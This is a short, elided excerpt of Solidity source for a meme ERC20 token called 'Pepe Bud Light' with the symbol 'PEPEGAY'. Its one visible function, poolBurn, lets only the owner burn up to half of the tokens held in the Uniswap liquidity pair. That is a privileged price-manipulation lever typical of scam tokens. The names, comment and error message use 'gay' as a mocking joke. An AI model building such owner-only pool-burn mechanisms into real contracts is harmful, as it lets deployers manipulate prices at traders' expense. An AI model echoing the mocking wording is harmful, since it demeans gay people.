// The gayest PEPE Bud Light to celebrate our collective cringe
...
contract PepeToken is Ownable, ERC20 {
    ...
    constructor() ERC20("Pepe Bud Light", "PEPEGAY") {
    ...
    function poolBurn(uint256 _percentOfPool) external onlyOwner {
        uint256 poolBalance = balanceOf(uniswapV2Pair);
        require(_percentOfPool < 51, "Exceedingly gay");
        uint256 burnQuantity = poolBalance * _percentOfPool / 100;
        _burn(uniswapV2Pair, burnQuantity)
;    }
